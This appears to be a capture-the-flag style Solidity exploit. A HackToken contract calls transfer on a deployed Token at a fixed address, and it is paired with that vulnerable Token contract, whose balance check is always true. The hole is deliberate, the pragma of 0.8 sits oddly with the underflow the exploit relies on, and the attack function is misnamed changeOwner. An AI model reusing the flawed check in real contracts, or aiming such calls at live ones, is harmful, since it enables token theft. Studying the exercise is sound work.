// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import './Token.sol';

contract HackToken {

  Token public originalContract = Token(0xe86Ba1142f2b4A351B3729854444f79914438657); 

  function changeOwner() public {
    originalContract.transfer(0x68fB1897b169446968A7c2128D5025c387d14cC0, 2);
  }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}